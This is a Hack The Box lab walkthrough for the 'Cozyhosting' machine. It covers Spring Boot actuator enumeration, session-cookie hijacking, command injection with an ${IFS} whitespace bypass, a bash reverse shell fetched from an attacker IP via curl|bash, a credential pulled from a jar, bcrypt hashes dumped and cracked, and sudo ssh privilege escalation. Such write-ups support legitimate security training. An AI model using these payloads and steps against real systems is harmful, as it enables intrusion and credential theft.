---
title: "Cozyhosting"
date: 2025-03-19
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "cozyhosting", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

# Cozyhosting

# Cozyhosting

## Summary
# Credentials
| Username | Password | Hash | Source |
| -------- | -------- | ---- | ------ |
|          |          |      |        |
# Known
- Spring boot
# Enumeration
- One of the links on the website gives `Whitelabel Error Page`. Searching for this error gives that it is running spring boot. 
- Brute-forcing directories with a spring boot wordlist shows directories. 
- Navigating to one of them `/sessions` provides a session cookie for user `kanderson`. 
- Saving the cookie and navigating to `/admin` outputs dashboard with input fields that are vulnerable to command injection.

![screenshot](/assets/images/cozyhosting29.png)

# Initial Access
- Sending a crafted reverse shell payload in the form above, provides initial access as user `app`.
# Lateral Movement
- In the home directory of the user `app`, there lies a zip file. 
- Postgre database credential can be obtained from the contents of the zip file. 
- Connecting to the postgre db with the obtained credential provides 2 bcrypt hashes. 
- Passwords can be obtained from cracking the hashes. 
# Privilege Escalation
- SSH as `josh` user with the obtained credential. 
- `sudo -l` shows that this user has sudo privileges to run SSH. 
- GTFOBins.

# Enumeration 
## 80-HTTP
# Screenshots
![screenshot](/assets/images/cozyhosting1.png)

![screenshot](/assets/images/cozyhosting2.png)

![screenshot](/assets/images/cozyhosting3.png)
-> didn't work
![screenshot](/assets/images/cozyhosting4.png)

![screenshot](/assets/images/cozyhosting5.png)

> The web application is using spring boot
# Gobuster
Using spring boot wordlist
```sh
└─$ gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/health      (Status: 200) [Size: 15]
/actuator/sessions    (Status: 200) [Size: 48]
/actuator/mappings    (Status: 200) [Size: 9938]
/actuator/beans       (Status: 200) [Size: 127224]
Progress: 112 / 113 (99.12%)
===============================================================
Finished
===============================================================
```


```sh
gobuster dir -u http://cozyhoting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput

└─$ gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/index                (Status: 200) [Size: 12706]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
/.                    (Status: 200) [Size: 0]
Progress: 56293 / 56294 (100.00%)
===============================================================
Finished
===============================================================
```

![screenshot](/assets/images/cozyhosting6.png)
-> Cookie

Copy and save to cozyhosting.htb (not /login)
![screenshot](/assets/images/cozyhosting7.png)

navigate to /admin
![screenshot](/assets/images/cozyhosting8.png)

# Foothold
we can try playing around with command injection using the username field. We know that the username field does not accept white spaces, so to bypass this we can use `${IFS}` as a delimiter, which is a special shell variable that stands for
__Internal Field Separator and defaults to a space (followed by a tab and a newline)__ in shells like Bash and sh .

![screenshot](/assets/images/cozyhosting9.png)

![screenshot](/assets/images/cozyhosting10.png)

```sh
# reverse shell
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.50/4444 0>&1' > rev.sh
```

Payload
```sh
test;curl${IFS}http://10.10.14.50/rev.sh|bash;
```

![screenshot](/assets/images/cozyhosting11.png)

# Privilege Escalation
# Linpeas
- codename : jammy
- 


![screenshot](/assets/images/cozyhosting12.png)
![screenshot](/assets/images/cozyhosting13.png)![screenshot](/assets/images/cozyhosting14.png)
![screenshot](/assets/images/cozyhosting15.png)
![screenshot](/assets/images/cozyhosting16.png)
![screenshot](/assets/images/cozyhosting17.png)
![screenshot](/assets/images/cozyhosting18.png)
# Lateral Movement
```sh
unzip -d /tmp/app cloudhosting-0.0.1 jar
```

![screenshot](/assets/images/cozyhosting19.png)

```text
spring.datasource.password = Vg&nvzAQ7XxR
```
## Postgres
```sh
# on the target
psql -h 127.0.0.1 -U postgres
\list
q # to exit result view
\connect cozyhosting
\dt
select * from users;
```

![screenshot](/assets/images/cozyhosting21.png)
![screenshot](/assets/images/cozyhosting22.png)
```test
kanderson: $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin : $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

![screenshot](/assets/images/cozyhosting23.png)

Considering that these hashes stem from a Spring Boot web application, the most likelycandidate is bcrypt . We save the administrator's hash to a file and attempt to crack it using Hashcat , with mode 3200 for bcrypt.

```sh
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force
```

![screenshot](/assets/images/cozyhosting24.png)

```text
manchesterunited
```

# josh
ssh as josh using the password obtained.
![screenshot](/assets/images/cozyhosting25.png)

![screenshot](/assets/images/cozyhosting26.png)
## GTFOBins
![screenshot](/assets/images/cozyhosting27.png)
![screenshot](/assets/images/cozyhosting28.png)

